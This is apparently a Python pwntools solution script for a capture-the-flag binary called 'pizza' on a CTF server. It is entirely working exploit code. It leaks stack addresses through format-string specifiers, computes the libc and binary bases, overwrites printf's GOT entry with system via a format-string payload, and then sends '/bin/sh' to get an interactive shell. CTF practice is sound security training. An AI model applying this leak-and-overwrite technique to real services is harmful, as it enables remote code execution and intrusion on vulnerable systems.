from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-v']
context.arch = 'x86_64'

target = './pizza'
target_elf = ELF(target)
libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# io = process(target)
# io = gdb.debug(target, gdbscript='''
# break system
# break *(main+533)
# continue
# ''')
io = remote('chall.lac.tf', 31134)
io.sendline(b'1')
io.sendline(b'12')
io.sendline(b"%47$p")
io.sendline(b'12')
io.sendline(b"%49$p")

io.recvuntil('0x')
main_ret = int.from_bytes(bytes.fromhex(io.recvline().decode()), 'big')
log.info(f"{hex(main_ret)=}")
io.recvuntil('0x')
main_start = int.from_bytes(bytes.fromhex(io.recvline().decode()), 'big')
log.info(f"{hex(main_start)=}")

# libc.address = main_ret - 171408
libc.address = main_ret - 160330
target_elf.address = main_start - target_elf.symbols['main']

payload = fmtstr_payload(19, {target_elf.got['printf'] : libc.symbols['system']}, numbwritten=4, overflows=128)
log.info(len(payload))

io.sendline(b'y')
io.sendline(b'1')
io.sendline(b'12')
io.sendline(b'aaaa' + payload)
io.sendline(b'12')
io.sendline(b"/bin/sh")

# io.sendline('n')
io.interactive()